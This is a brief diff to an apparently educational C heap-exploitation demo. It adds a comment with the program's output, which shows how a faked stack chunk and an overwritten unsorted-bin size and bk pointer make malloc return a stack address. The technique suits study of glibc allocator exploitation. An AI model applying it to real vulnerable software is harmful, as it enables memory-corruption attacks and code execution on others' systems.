@@ -29,3 +29,15 @@ int main() {
   fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
   fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
 }
+
+/*
+
+Allocating the victim chunk
+Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
+Freeing the chunk 0x55b79bfba260, it will be inserted in the unsorted bin
+Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
+Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
+Now next malloc will return the region of our fake chunk: 0x7fff2bdd5560
+malloc(0x100): 0x55b79bfba260
+
+*/
